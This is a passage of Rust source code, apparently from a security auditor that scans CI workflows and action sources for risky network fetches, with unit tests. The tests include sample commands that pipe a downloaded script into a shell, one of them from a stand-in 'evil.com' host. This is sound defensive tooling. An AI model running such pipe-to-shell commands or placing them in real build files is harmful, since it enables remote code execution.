    // Suppress findings immediately followed by checksum verification: a
    // sha256sum / gpg --verify check deterministically detects a tampered
    // download, so the fetch is mitigated, not merely less severe. Recorded as
    // an allowed match (visible under --verbose), mirroring the SHA-checkout
    // suppression above. Pipe-shell findings sit below `findings_before` and are
    // exempt — the piped payload is never written to disk for a checksum to
    // verify. Offset 0 covers a one-liner `curl -o f … && sha256sum -c …`.
    let mut idx = findings_before;
    while idx < collector.findings.len() {
        let verified = collector.findings[idx].line.is_some_and(|finding_line| {
            let rel = finding_line.saturating_sub(base_line);
            logical
                .iter()
                .position(|(start, _)| *start == rel)
                .is_some_and(|li| {
                    let targets = fetch_output_targets(&collector.findings[idx].pattern_matched);
                    !targets.is_empty()
                        && targets.iter().all(|target| {
                            (0..=3).any(|offset| {
                                li + offset < logical.len()
                                    && checksum_verifies_target(&logical[li + offset].1, target)
                            })
                        })
                })
        });
        if verified {
            let finding = collector.findings.remove(idx);
            collector.push_allowed(AuditMatch {
                severity: finding.severity,
                category: finding.category,
                action: finding.action,
                source_file: finding.source_file,
                line: finding.line,
                pattern_matched: finding.pattern_matched,
                reason: "followed by checksum verification".to_string(),
            });
        } else {
            idx += 1;
        }
    }
}

/// Lines longer than this are treated as minified and split on `;` before scanning.
const MINIFIED_LINE_THRESHOLD: usize = 500;

fn scan_js_content(
    content: &str,
    source_file: &str,
    action_name: &str,
    collector: &mut AuditCollector,
    config: &Config,
) {
    for (i, line) in content.lines().enumerate() {
        let line_num = i + 1;

        if line.len() > MINIFIED_LINE_THRESHOLD {
            for segment in line.split(';') {
                let segment = segment.trim();
                if segment.is_empty() {
                    continue;
                }
                check_patterns(
                    &JS_PATTERNS,
                    segment,
                    source_file,
                    line_num,
                    action_name,
                    collector,
                );
                check_url_patterns(
                    &JS_URL_PATTERNS,
                    segment,
                    source_file,
                    line_num,
                    action_name,
                    collector,
                    config,
                );
            }
        } else {
            check_patterns(
                &JS_PATTERNS,
                line,
                source_file,
                line_num,
                action_name,
                collector,
            );
            check_url_patterns(
                &JS_URL_PATTERNS,
                line,
                source_file,
                line_num,
                action_name,
                collector,
                config,
            );
        }
    }
}

fn scan_py_content(
    content: &str,
    source_file: &str,
    action_name: &str,
    collector: &mut AuditCollector,
    config: &Config,
) {
    for (i, line) in content.lines().enumerate() {
        let line_num = i + 1;

        check_patterns(
            &PY_PATTERNS,
            line,
            source_file,
            line_num,
            action_name,
            collector,
        );
        check_url_patterns(
            &PY_URL_PATTERNS,
            line,
            source_file,
            line_num,
            action_name,
            collector,
            config,
        );
    }
}

fn scan_dockerfile_content(
    content: &str,
    source_file: &str,
    action_name: &str,
    collector: &mut AuditCollector,
    config: &Config,
) {
    // Dockerfile RUN instructions lean heavily on trailing-backslash
    // continuations; scan logical lines so a fetch split across physical
    // lines is still seen whole.
    let logical = join_continuations(content);

    // Multi-stage builds name stages via `FROM … AS <name>`. Collect those
    // names so a later `FROM <name>` is recognized as a stage reference, not an
    // image pull — otherwise it false-positives as an untagged image.
    let stage_names: HashSet<String> = logical
        .iter()
        .filter_map(|(_, line)| audit_patterns::dockerfile_stage_alias(line))
        .collect();

    // Escalate `RUN curl ... | sh` from medium (DOCKER_RUN_CURL) to high.
    let mut pipe_shell_lines: HashSet<usize> = HashSet::new();
    for (start, line) in &logical {
        let line_num = start + 1;
        let before = collector.findings.len();
        check_patterns(
            &SHELL_PIPE_PATTERNS,
            line,
            source_file,
            line_num,
            action_name,
            collector,
        );
        if collector.findings.len() > before {
            pipe_shell_lines.insert(line_num);
        }
    }

    for (start, line) in &logical {
        let line = line.as_str();
        let line_num = start + 1;

        if audit_patterns::DOCKER_FROM_DIGEST.is_match(line) {
            continue;
        }
        if pipe_shell_lines.contains(&line_num) {
            continue;
        }
        // `FROM <stage>` (an earlier build stage) and `FROM scratch` (the empty
        // base) are not unpinned image pulls — there's nothing to pin.
        if let Some(base) = audit_patterns::dockerfile_from_base(line)
            && (base == "scratch" || stage_names.contains(&base))
        {
            continue;
        }

        check_patterns(
            &DOCKER_PATTERNS,
            line,
            source_file,
            line_num,
            action_name,
            collector,
        );

        check_url_patterns(
            &DOCKER_URL_PATTERNS,
            line,
            source_file,
            line_num,
            action_name,
            collector,
            config,
        );

        if SH_GIT_CLONE.is_match(line) && !git_clone_has_pinned_ref(line) {
            collector.push_finding(AuditFinding {
                severity: output::severity_str(&audit_patterns::Severity::Medium).to_string(),
                category: category_str(&audit_patterns::Category::DockerUnpinned).to_string(),
                action: action_name.to_string(),
                source_file: source_file.to_string(),
                line: Some(line_num),
                pattern_matched: line.trim().to_string(),
                description: "git clone in Dockerfile without pinned ref".to_string(),
                workflow_file: None,
                workflow_line: None,
            });
        }
    }
}

fn push_pkg_finding(
    description: &str,
    severity: audit_patterns::Severity,
    line: &str,
    source_file: &str,
    line_num: usize,
    action_name: &str,
    collector: &mut AuditCollector,
) {
    collector.push_finding(AuditFinding {
        severity: output::severity_str(&severity).to_string(),
        category: category_str(&audit_patterns::Category::ShellFetch).to_string(),
        action: action_name.to_string(),
        source_file: source_file.to_string(),
        line: Some(line_num),
        pattern_matched: line.trim().to_string(),
        description: description.to_string(),
        workflow_file: None,
        workflow_line: None,
    });
}

fn check_url_patterns(
    patterns: &[Pattern],
    line: &str,
    source_file: &str,
    line_num: usize,
    action_name: &str,
    collector: &mut AuditCollector,
    config: &Config,
) {
    // The URL classification below is line-level, so every matching pattern
    // would reach the identical verdict on the identical URL set: record once
    // for the first match instead of once per pattern (`curl … && wget …`
    // previously emitted two findings for the same line).
    let Some(pattern) = patterns.iter().find(|p| p.regex.is_match(line)) else {
        return;
    };

    // Check EVERY URL, not just the first: a versioned/trusted decoy before
    // the real fetch must not suppress the finding. Allowed only if all URLs
    // are exempt; any unexempt one is a finding.
    let mut allowed_reason: Option<&str> = None;
    let mut dangerous = false;
    for url in extract_urls(line) {
        if url_has_version(url) {
            allowed_reason.get_or_insert("versioned URL");
        } else if config.is_host_trusted(url) {
            allowed_reason.get_or_insert(REASON_TRUSTED_HOST);
        } else if config.is_extra_data_format_exempt(url) {
            allowed_reason.get_or_insert(REASON_EXTRA_DATA_FORMAT);
        } else if config.is_data_format_exempt(url) {
            allowed_reason.get_or_insert("data format URL");
        } else if url_piped_to_jq(line, url) {
            allowed_reason.get_or_insert("piped to jq");
        } else {
            dangerous = true;
            break;
        }
    }

    if dangerous {
        if let Some(reason) = allowed_reason {
            collector.push_allowed(AuditMatch {
                severity: output::severity_str(&pattern.severity).to_string(),
                category: category_str(&pattern.category).to_string(),
                action: action_name.to_string(),
                source_file: source_file.to_string(),
                line: Some(line_num),
                pattern_matched: line.trim().to_string(),
                reason: reason.to_string(),
            });
        }
        collector.push_finding(AuditFinding {
            severity: output::severity_str(&pattern.severity).to_string(),
            category: category_str(&pattern.category).to_string(),
            action: action_name.to_string(),
            source_file: source_file.to_string(),
            line: Some(line_num),
            pattern_matched: line.trim().to_string(),
            description: pattern.description.to_string(),
            workflow_file: None,
            workflow_line: None,
        });
    } else if let Some(reason) = allowed_reason {
        collector.push_allowed(AuditMatch {
            severity: output::severity_str(&pattern.severity).to_string(),
            category: category_str(&pattern.category).to_string(),
            action: action_name.to_string(),
            source_file: source_file.to_string(),
            line: Some(line_num),
            pattern_matched: line.trim().to_string(),
            reason: reason.to_string(),
        });
    }
    // No URL on the line: nothing to record.
}

fn check_patterns(
    patterns: &[Pattern],
    line: &str,
    source_file: &str,
    line_num: usize,
    action_name: &str,
    collector: &mut AuditCollector,
) {
    for pattern in patterns {
        if pattern.regex.is_match(line) {
            collector.push_finding(AuditFinding {
                severity: output::severity_str(&pattern.severity).to_string(),
                category: category_str(&pattern.category).to_string(),
                action: action_name.to_string(),
                source_file: source_file.to_string(),
                line: Some(line_num),
                pattern_matched: line.trim().to_string(),
                description: pattern.description.to_string(),
                workflow_file: None,
                workflow_line: None,
            });
        }
    }
}

/// Third-party dependency dirs, not the action's own source. An action that
/// commits `node_modules/` would otherwise cost thousands of per-file fetches
/// for zero signal. `dist/` is excluded — a bundled `dist/index.js` is the
/// code that actually runs and must still be scanned.
const VENDORED_DIRS: &[&str] = &["node_modules", "site-packages", ".venv", "venv"];

/// Matches whole path components, so `node_modules_helper.js` is not affected.
fn is_vendored_path(path: &str) -> bool {
    path.split('/')
        .any(|component| VENDORED_DIRS.contains(&component))
}

/// Max action source files fetched concurrently. Bounds the fan-out so a
/// file-heavy action doesn't burst into a rate-limit-exhausting wave.
const MAX_CONCURRENT_FILE_FETCHES: usize = 8;

/// Which scanner handles a given action source file.
#[derive(Debug, Clone, Copy, PartialEq, Eq)]
enum SourceFileKind {
    ActionYml,
    JavaScript,
    Python,
    Dockerfile,
}

/// Whether all selected action source files were fetched and parsed well
/// enough to support a durable "clean" verdict.
#[derive(Debug, Clone, Copy, PartialEq, Eq)]
enum ActionScanStatus {
    Complete,
    Incomplete,
}

impl ActionScanStatus {
    fn from_complete(complete: bool) -> Self {
        if complete {
            Self::Complete
        } else {
            Self::Incomplete
        }
    }
}

/// Select the files in a fetched action tree worth scanning, each paired with
/// its scanner, in tree order. Pure (no I/O) so the filtering is unit testable.
fn select_source_files(
    tree: &[crate::github::TreeEntry],
    base: &str,
) -> Vec<(String, SourceFileKind)> {
    let mut targets = Vec::new();
    for entry in tree {
        if entry.entry_type != "blob" {
            continue;
        }
        let path = &entry.path;
        if is_vendored_path(path) {
            continue;
        }
        if !base.is_empty() && path != base && !path.starts_with(&format!("{base}/")) {
            continue;
        }
        let relative = if base.is_empty() {
            path.as_str()
        } else {
            path.strip_prefix(base)
                .unwrap_or(path)
                .trim_start_matches('/')
        };
        let kind = if relative == "action.yml" || relative == "action.yaml" {
            SourceFileKind::ActionYml
        } else if is_javascript_source(path) {
            SourceFileKind::JavaScript
        } else if path.ends_with(".py") {
            SourceFileKind::Python
        } else if relative == "Dockerfile" || path.ends_with(".dockerfile") {
            SourceFileKind::Dockerfile
        } else {
            continue;
        };
        targets.push((path.clone(), kind));
    }
    targets
}

fn force_include_remote_action_entrypoints(
    base: &str,
    targets: &mut Vec<(String, SourceFileKind)>,
    contents: &[Option<Result<String>>],
) {
    let metadata: Vec<String> = targets
        .iter()
        .zip(contents)
        .filter_map(|((_, kind), content)| {
            if *kind != SourceFileKind::ActionYml {
                return None;
            }
            let Some(Ok(content)) = content.as_ref() else {
                return None;
            };
            Some(content.clone())
        })
        .collect();

    for content in metadata {
        let Ok(yaml) = serde_norway::from_str::<Value>(&content) else {
            continue;
        };
        for entrypoint in action_yml_entrypoint_paths(&yaml, base) {
            push_unique_source_target(targets, entrypoint, SourceFileKind::JavaScript);
        }
    }
}

fn force_include_local_action_entrypoints(
    action_dir: &Path,
    targets: &mut Vec<(PathBuf, SourceFileKind)>,
) {
    let metadata_paths: Vec<PathBuf> = targets
        .iter()
        .filter_map(|(path, kind)| (*kind == SourceFileKind::ActionYml).then_some(path.clone()))
        .collect();

    for path in metadata_paths {
        let Ok(content) = std::fs::read_to_string(&path) else {
            continue;
        };
        let Ok(yaml) = serde_norway::from_str::<Value>(&content) else {
            continue;
        };
        for entrypoint in action_yml_entrypoint_paths(&yaml, "") {
            let path = action_dir.join(&entrypoint);
            if local_entrypoint_is_regular_file(&path) {
                push_unique_local_source_target(targets, path, SourceFileKind::JavaScript);
            }
        }
    }
}

fn action_yml_entrypoint_paths(yaml: &Value, base: &str) -> Vec<String> {
    let Some(runs) = yaml.get("runs").and_then(|r| r.as_mapping()) else {
        return Vec::new();
    };

    ["main", "pre", "post"]
        .into_iter()
        .filter_map(|key| runs.get(key).and_then(|v| v.as_str()))
        .filter_map(|path| normalize_action_entrypoint_path(base, path))
        .collect()
}

fn normalize_action_entrypoint_path(base: &str, path: &str) -> Option<String> {
    let path = path.trim();
    if path.is_empty() || path.contains('\\') {
        return None;
    }
    let rel = Path::new(path);
    if rel.is_absolute() {
        return None;
    }

    let mut parts = Vec::new();
    for component in rel.components() {
        match component {
            Component::Normal(part) => parts.push(part.to_str()?.to_string()),
            Component::CurDir => {}
            _ => return None,
        }
    }
    if parts.is_empty() {
        return None;
    }

    let rel = parts.join("/");
    if base.is_empty() {
        Some(rel)
    } else {
        Some(format!("{base}/{rel}"))
    }
}

fn push_unique_source_target(
    targets: &mut Vec<(String, SourceFileKind)>,
    path: String,
    kind: SourceFileKind,
) {
    if !targets.iter().any(|(existing, _)| existing == &path) {
        targets.push((path, kind));
    }
}

fn push_unique_local_source_target(
    targets: &mut Vec<(PathBuf, SourceFileKind)>,
    path: PathBuf,
    kind: SourceFileKind,
) {
    if !targets.iter().any(|(existing, _)| existing == &path) {
        targets.push((path, kind));
    }
}

fn local_entrypoint_is_regular_file(path: &Path) -> bool {
    std::fs::symlink_metadata(path)
        .map(|metadata| metadata.file_type().is_file())
        .unwrap_or_default()
}

async fn fetch_remote_source_files(
    client: &GitHubClient,
    action: &ActionRef,
    targets: &[(String, SourceFileKind)],
) -> (Vec<Option<Result<String>>>, bool) {
    let semaphore = Arc::new(Semaphore::new(MAX_CONCURRENT_FILE_FETCHES));
    let mut fetches = tokio::task::JoinSet::new();
    for (index, (path, _)) in targets.iter().enumerate() {
        let client = client.clone();
        let owner = action.owner.clone();
        let repo = action.repo.clone();
        let git_ref = action.ref_string.clone();
        let path = path.clone();
        let semaphore = Arc::clone(&semaphore);
        fetches.spawn(async move {
            let _permit = semaphore.acquire_owned().await.ok();
            let content = client.fetch_file(&owner, &repo, &path, &git_ref).await;
            (index, content)
        });
    }

    let mut contents: Vec<Option<Result<String>>> = (0..targets.len()).map(|_| None).collect();
    let mut complete = true;
    while let Some(joined) = fetches.join_next().await {
        match joined {
            Ok((index, content)) => {
                if content.is_err() {
                    complete = false;
                }
                contents[index] = Some(content);
            }
            Err(_) => {
                complete = false;
            }
        }
    }

    (contents, complete)
}

fn collect_local_source_files(action_dir: &Path) -> Result<Vec<(PathBuf, SourceFileKind)>> {
    fn visit(dir: &Path, base: &Path, targets: &mut Vec<(PathBuf, SourceFileKind)>) -> Result<()> {
        let mut entries = Vec::new();
        for entry in std::fs::read_dir(dir).with_context(|| format!("reading {}", dir.display()))? {
            entries.push(entry?);
        }
        entries.sort_by_key(|e| e.path());

        for entry in entries {
            let path = entry.path();
            let relative = path
                .strip_prefix(base)
                .unwrap_or(&path)
                .to_string_lossy()
                .replace('\\', "/");

            if is_vendored_path(&relative) {
                continue;
            }

            // `file_type()` does not follow symlinks, so a symlinked entry is
            // neither file nor dir here and is skipped. Deliberate: it keeps
            // traversal inside the action directory (a symlink can't redirect
            // the scan outside it) at the cost of not scanning symlinked source
            // — an acceptable trade-off since local actions are first-party.
            let file_type = entry.file_type()?;
            if file_type.is_dir() {
                visit(&path, base, targets)?;
            } else if file_type.is_file()
                && let Some(kind) = source_file_kind(&relative)
            {
                targets.push((path, kind));
            }
        }
        Ok(())
    }

    let mut targets = Vec::new();
    visit(action_dir, action_dir, &mut targets)?;
    Ok(targets)
}

fn source_file_kind(relative: &str) -> Option<SourceFileKind> {
    if relative == "action.yml" || relative == "action.yaml" {
        Some(SourceFileKind::ActionYml)
    } else if is_javascript_source(relative) {
        Some(SourceFileKind::JavaScript)
    } else if relative.ends_with(".py") {
        Some(SourceFileKind::Python)
    } else if relative == "Dockerfile" || relative.ends_with(".dockerfile") {
        Some(SourceFileKind::Dockerfile)
    } else {
        None
    }
}

fn is_javascript_source(path: &str) -> bool {
    path.ends_with(".js")
        || path.ends_with(".ts")
        || path.ends_with(".mjs")
        || path.ends_with(".cjs")
}

fn local_action_dir(repo_root: &Path, action: &LocalActionRef) -> Result<PathBuf> {
    let Some(rel) = action.path.strip_prefix("./") else {
        anyhow::bail!("local action path must start with ./");
    };
    let rel_path = Path::new(rel);
    if rel.is_empty()
        || !rel_path
            .components()
            .all(|c| matches!(c, Component::Normal(_)))
    {
        anyhow::bail!("local action path escapes the repository");
    }

    let action_dir = repo_root.join(rel);
    if workflow::open_child_dir_path(repo_root, rel_path)?.is_none() {
        anyhow::bail!("{} is not a directory", action_dir.display());
    }
    Ok(action_dir)
}

fn scan_local_action_source(
    repo_root: &Path,
    action: &LocalActionRef,
    collector: &mut AuditCollector,
    config: &Config,
) -> Result<ActionScanStatus> {
    let action_dir = local_action_dir(repo_root, action)?;
    let mut targets = collect_local_source_files(&action_dir)?;
    force_include_local_action_entrypoints(&action_dir, &mut targets);
    if targets.is_empty() {
        return Ok(ActionScanStatus::Complete);
    }

    let mut complete = true;
    for (path, kind) in targets {
        let content = match std::fs::read_to_string(&path) {
            Ok(content) => content,
            Err(_) => {
                complete = false;
                continue;
            }
        };
        let relative = path
            .strip_prefix(&action_dir)
            .unwrap_or(&path)
            .to_string_lossy()
            .replace('\\', "/");
        let source_label = format!("{} ({relative})", action.path);
        match kind {
            SourceFileKind::ActionYml => match serde_norway::from_str::<Value>(&content) {
                Ok(yaml) => {
                    scan_action_yml_runs(&yaml, &source_label, &action.path, collector, config);
                }
                Err(_) => {
                    complete = false;
                }
            },
            SourceFileKind::JavaScript => {
                scan_js_content(&content, &source_label, &action.path, collector, config);
            }
            SourceFileKind::Python => {
                scan_py_content(&content, &source_label, &action.path, collector, config);
            }
            SourceFileKind::Dockerfile => {
                scan_dockerfile_content(&content, &source_label, &action.path, collector, config);
            }
        }
    }

    Ok(ActionScanStatus::from_complete(complete))
}

async fn scan_action_source(
    client: &GitHubClient,
    action: &ActionRef,
    collector: &mut AuditCollector,
    config: &Config,
) -> Result<ActionScanStatus> {
    let action_name = format!("{}@{}", action.full_name(), short_sha(&action.ref_string));
    let tree = client
        .fetch_tree(&action.owner, &action.repo, &action.ref_string)
        .await?;

    let base = action.subpath.as_deref().unwrap_or("");
    let mut targets = select_source_files(&tree, base);
    if targets.is_empty() {
        return Ok(ActionScanStatus::Complete);
    }

    // Fetch concurrently, then scan in tree order so findings are
    // deterministic regardless of which fetch lands first. A failed fetch
    // makes the scan incomplete, so the caller will not cache a clean verdict.
    let (mut contents, mut complete) = fetch_remote_source_files(client, action, &targets).await;
    let initial_len = targets.len();
    force_include_remote_action_entrypoints(base, &mut targets, &contents);
    if targets.len() > initial_len {
        let (new_contents, new_complete) =
            fetch_remote_source_files(client, action, &targets[initial_len..]).await;
        contents.extend(new_contents);
        complete &= new_complete;
    }

    for ((path, kind), content) in targets.iter().zip(contents) {
        let content = match content {
            Some(Ok(content)) => content,
            _ => continue,
        };
        let source_label = format!("{} ({path})", action.full_name());
        match kind {
            SourceFileKind::ActionYml => match serde_norway::from_str::<Value>(&content) {
                Ok(yaml) => {
                    scan_action_yml_runs(&yaml, &source_label, &action_name, collector, config);
                }
                Err(_) => {
                    complete = false;
                }
            },
            SourceFileKind::JavaScript => {
                scan_js_content(&content, &source_label, &action_name, collector, config);
            }
            SourceFileKind::Python => {
                scan_py_content(&content, &source_label, &action_name, collector, config);
            }
            SourceFileKind::Dockerfile => {
                scan_dockerfile_content(&content, &source_label, &action_name, collector, config);
            }
        }
    }

    Ok(ActionScanStatus::from_complete(complete))
}

fn scan_action_yml_runs(
    yaml: &Value,
    source_file: &str,
    action_name: &str,
    collector: &mut AuditCollector,
    config: &Config,
) {
    // runs.steps[].run (composite actions), including nested parallel groups.
    // base_line 0: positions are block-relative — the block is never located
    // inside the fetched file.
    if let Some(steps) = yaml.get("runs").and_then(|r| r.get("steps")) {
        for run in collect_step_run_blocks(steps) {
            scan_shell_content(run, source_file, 0, action_name, collector, config);
        }
    }

    // runs.args (some actions use shell: bash with inline scripts)
    if let Some(args) = yaml.get("runs").and_then(|r| r.get("args")) {
        if let Some(args) = args.as_str() {
            scan_shell_content(args, source_file, 0, action_name, collector, config);
        } else if let Some(args) = args.as_sequence() {
            for arg in args {
                if let Some(arg) = arg.as_str() {
                    scan_shell_content(arg, source_file, 0, action_name, collector, config);
                }
            }
        }
    }
}

fn short_sha(sha: &str) -> &str {
    if sha.len() >= 7 { &sha[..7] } else { sha }
}

#[cfg(test)]
mod tests {
    use super::*;
    use std::sync::LazyLock;

    static DEFAULT_CONFIG: LazyLock<Config> = LazyLock::new(Config::default);

    #[test]
    fn collector_drops_allowed_when_not_verbose() {
        let mut c = AuditCollector::new(false);
        c.push_allowed(AuditMatch {
            severity: "medium".into(),
            category: "shell_fetch".into(),
            action: String::new(),
            source_file: "test".into(),
            line: Some(1),
            pattern_matched: "curl https://example.com/v1.2.3/foo".into(),
            reason: "versioned URL".into(),
        });
        assert!(c.allowed.is_empty());
    }

    #[test]
    fn collector_keeps_allowed_when_verbose() {
        let mut c = AuditCollector::new(true);
        c.push_allowed(AuditMatch {
            severity: "medium".into(),
            category: "shell_fetch".into(),
            action: String::new(),
            source_file: "test".into(),
            line: Some(1),
            pattern_matched: "curl https://example.com/v1.2.3/foo".into(),
            reason: "versioned URL".into(),
        });
        assert_eq!(c.allowed.len(), 1);
    }

    #[test]
    fn find_run_line_advances_past_earlier_match() {
        // Two `run:` blocks both start with `echo hello`. The second one must
        // map to its own line, not the first occurrence, so checksum-suppression
        // windows and SARIF locations stay anchored correctly.
        let yaml = "\
jobs:
  a:
    steps:
      - run: |
          echo hello
          curl https://example.com/install.sh | sh
      - run: |
          echo hello
          curl https://example.com/install.sh | sh
";
        let (first, cursor) = find_run_line(yaml, "echo hello\n          curl ...", 0);
        assert_eq!(first, 5, "first block should anchor at line 5");
        let (second, _) = find_run_line(yaml, "echo hello\n          curl ...", cursor);
        assert_eq!(
            second, 8,
            "second block must skip the first block's first-line match"
        );
    }

    #[test]
    fn find_run_line_empty_run_content() {
        let (line, cursor) = find_run_line("foo\nbar\n", "", 0);
        assert_eq!((line, cursor), (0, 0));
    }

    #[test]
    fn find_run_line_no_match_preserves_cursor() {
        let (line, cursor) = find_run_line("foo\nbar\n", "baz", 1);
        assert_eq!((line, cursor), (0, 1));
    }

    #[test]
    fn find_run_line_prefers_exact_trimmed_match() {
        // A longer line that `contains` the target shouldn't steal the
        // anchor from the actual run block's first line further down.
        let file = "\
prefix echo hello world
    echo hello
more stuff
";
        let (line, cursor) = find_run_line(file, "echo hello", 0);
        assert_eq!((line, cursor), (2, 2));
    }

    #[test]
    fn find_run_line_falls_back_to_contains() {
        // No exact trimmed match exists, so `contains` still anchors.
        let file = "echo hello world\nother\n";
        let (line, cursor) = find_run_line(file, "echo hello", 0);
        assert_eq!((line, cursor), (1, 1));
    }

    #[test]
    fn extract_run_blocks_recurses_into_parallel_steps() {
        let yaml = r#"
jobs:
  test:
    runs-on: ubuntu-latest
    steps:
      - run: echo outside
      - parallel:
          - run: echo nested one
          - name: Nested two
            run: |
              echo nested two
"#;
        let blocks = extract_run_blocks(Path::new("workflow.yml"), yaml).unwrap();
        let runs = blocks.iter().map(|(_, run)| run.trim()).collect::<Vec<_>>();

        assert_eq!(
            runs,
            vec!["echo outside", "echo nested one", "echo nested two"]
        );
    }

    #[test]
    fn extract_run_blocks_anchors_nested_parallel_blocks_in_document_order() {
        let yaml = "\
jobs:
  test:
    steps:
      - run: |
          echo shared
          echo first
      - parallel:
          - run: |
              echo shared
              echo nested
      - run: |
          echo shared
          echo third
";
        let blocks = extract_run_blocks(Path::new("workflow.yml"), yaml).unwrap();
        let lines = blocks.iter().map(|(line, _run)| *line).collect::<Vec<_>>();

        assert_eq!(lines, vec![5, 9, 12]);
    }

    #[test]
    fn scan_shell_content_flags_parallel_pipe_to_shell() {
        let yaml = r#"
jobs:
  test:
    runs-on: ubuntu-latest
    steps:
      - parallel:
          - run: curl https://example.com/install.sh | sh
"#;
        let blocks = extract_run_blocks(Path::new("workflow.yml"), yaml).unwrap();
        let mut c = AuditCollector::new(false);

        for (line, run) in blocks {
            scan_shell_content(&run, "workflow.yml", line, "", &mut c, &DEFAULT_CONFIG);
        }

        assert_eq!(c.findings.len(), 1);
        assert_eq!(c.findings[0].severity, "high");
    }

    #[test]
    fn parallel_control_steps_do_not_create_spurious_findings() {
        let yaml = r#"
jobs:
  test:
    runs-on: ubuntu-latest
    steps:
      - wait: server
      - parallel:
          - wait: server
          - cancel: server
          - uses: actions/checkout@aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
          - run: echo safe
      - cancel: server
"#;
        let blocks = extract_run_blocks(Path::new("workflow.yml"), yaml).unwrap();
        let mut c = AuditCollector::new(false);

        for (line, run) in &blocks {
            scan_shell_content(run, "workflow.yml", *line, "", &mut c, &DEFAULT_CONFIG);
        }

        assert_eq!(blocks.len(), 1);
        assert_eq!(blocks[0].1.trim(), "echo safe");
        assert!(c.findings.is_empty());
    }

    #[test]
    fn scan_content_finds_uses_inside_parallel_group() {
        let yaml = r#"
jobs:
  test:
    runs-on: ubuntu-latest
    steps:
      - parallel:
          - uses: actions/checkout@v4
"#;
        let refs = workflow::scan_content(yaml);

        assert_eq!(refs.len(), 1);
        assert_eq!(refs[0].full_name(), "actions/checkout");
    }

    #[test]
    fn extract_run_blocks_recurses_into_nested_parallel() {
        // `parallel:` nested inside `parallel:` — each level is a sequence of
        // steps, walked the same way as the top-level list.
        let yaml = r#"
jobs:
  test:
    runs-on: ubuntu-latest
    steps:
      - parallel:
          - run: echo outer
          - parallel:
              - run: echo inner
"#;
        let blocks = extract_run_blocks(Path::new("workflow.yml"), yaml).unwrap();
        let runs = blocks.iter().map(|(_, run)| run.trim()).collect::<Vec<_>>();

        assert_eq!(runs, vec!["echo outer", "echo inner"]);
    }

    #[test]
    fn extract_run_blocks_flags_backgrounded_service_run() {
        // A `background: true` step keeps its `run:`, so a risky service start
        // must still be scanned.
        let yaml = r#"
jobs:
  test:
    runs-on: ubuntu-latest
    steps:
      - name: Start service
        run: curl https://example.com/install.sh | sh
        background: true
"#;
        let blocks = extract_run_blocks(Path::new("workflow.yml"), yaml).unwrap();
        let mut c = AuditCollector::new(false);

        for (line, run) in blocks {
            scan_shell_content(&run, "workflow.yml", line, "", &mut c, &DEFAULT_CONFIG);
        }

        assert_eq!(c.findings.len(), 1);
        assert_eq!(c.findings[0].severity, "high");
    }

    #[test]
    fn is_shell_comment_line_detects_leading_hash() {
        assert!(is_shell_comment_line("# comment"));
        assert!(is_shell_comment_line("    # indented comment"));
        assert!(is_shell_comment_line("\t# tab indent"));
    }

    #[test]
    fn is_shell_comment_line_rejects_trailing_hash() {
        // Trailing comments aren't covered — an unquoted `#` can't be
        // distinguished from one inside a string without real shell parsing.
        assert!(!is_shell_comment_line("echo hello  # note"));
        assert!(!is_shell_comment_line("foo=\"# not a comment\""));
    }

    #[test]
    fn join_continuations_merges_trailing_backslash() {
        let joined = join_continuations("curl https://x.example/s.sh \\\n  | sh\n");
        assert_eq!(joined.len(), 1);
        assert_eq!(joined[0].0, 0);
        assert_eq!(joined[0].1, "curl https://x.example/s.sh  | sh");
    }

    #[test]
    fn join_continuations_merges_trailing_pipeline_operators() {
        let joined = join_continuations(
            "curl https://x.example/s.sh |\n  sh\necho ok &&\n  true\necho no ||\n  false\n",
        );
        assert_eq!(
            joined,
            vec![
                (0, "curl https://x.example/s.sh | sh".into()),
                (2, "echo ok && true".into()),
                (4, "echo no || false".into()),
            ]
        );
    }

    #[test]
    fn join_continuations_leaves_unbroken_lines_alone() {
        let joined = join_continuations("echo one\necho two\n");
        assert_eq!(joined, vec![(0, "echo one".into()), (1, "echo two".into())]);
    }

    #[test]
    fn join_continuations_handles_multiple_breaks() {
        let joined = join_continuations("curl \\\n  -L \\\n  https://x.example/s.sh | sh\n");
        assert_eq!(joined.len(), 1);
        assert!(joined[0].1.contains("curl"));
        assert!(joined[0].1.contains("| sh"));
    }

    #[test]
    fn shell_scan_catches_pipe_to_shell_across_continuation() {
        let mut c = AuditCollector::new(false);
        scan_shell_content(
            "curl -fsSL https://example.com/install.sh \\\n  | sh\n",
            "test.sh",
            1,
            "",
            &mut c,
            &DEFAULT_CONFIG,
        );
        assert_eq!(c.findings.len(), 1);
        assert_eq!(c.findings[0].severity, "high");
        assert_eq!(c.findings[0].line, Some(1));
    }

    #[test]
    fn shell_scan_catches_pipe_to_shell_after_pipeline_newline() {
        let mut c = AuditCollector::new(true);
        scan_shell_content(
            "curl -fsSL https://example.com/releases/download/v1.2.3/install.sh |\n  bash\n",
            "test.sh",
            1,
            "",
            &mut c,
            &DEFAULT_CONFIG,
        );
        assert_eq!(c.findings.len(), 1);
        assert_eq!(c.findings[0].severity, "high");
        assert!(c.findings[0].description.contains("piped to shell"));
        assert!(c.allowed.is_empty());
    }

    #[test]
    fn shell_scan_records_one_finding_when_multiple_url_patterns_match() {
        // curl and wget on one line reach the same line-level URL verdict;
        // two findings for the same line would be duplicate noise.
        let mut c = AuditCollector::new(false);
        scan_shell_content(
            "curl -O https://example.com/a.tar.gz && wget https://example.com/b.tar.gz\n",
            "test.sh",
            1,
            "",
            &mut c,
            &DEFAULT_CONFIG,
        );
        assert_eq!(c.findings.len(), 1);
        assert_eq!(c.findings[0].line, Some(1));
    }

    #[test]
    fn shell_scan_skips_comment_line_with_cargo_install() {
        // A comment documenting what a sed command matches shouldn't fire —
        // the shell never executes comment-line content.
        let mut c = AuditCollector::new(true);
        scan_shell_content(
            "# Match `cargo install TOOL --locked`",
            "test.sh",
            1,
            "",
            &mut c,
            &DEFAULT_CONFIG,
        );
        assert!(c.findings.is_empty());
        assert!(c.allowed.is_empty());
    }

    #[test]
    fn shell_scan_skips_comment_line_with_curl_pipe_to_shell() {
        let mut c = AuditCollector::new(true);
        scan_shell_content(
            "# Example of a bad pattern: curl https://evil.com/install.sh | sh",
            "test.sh",
            1,
            "",
            &mut c,
            &DEFAULT_CONFIG,
        );
        assert!(c.findings.is_empty());
    }

    #[test]
    fn shell_scan_unversioned_curl_is_finding() {
        let mut c = AuditCollector::new(true);
        scan_shell_content(
            "curl -L https://example.com/install.sh -o foo",
            "test.sh",
            1,
            "",
            &mut c,
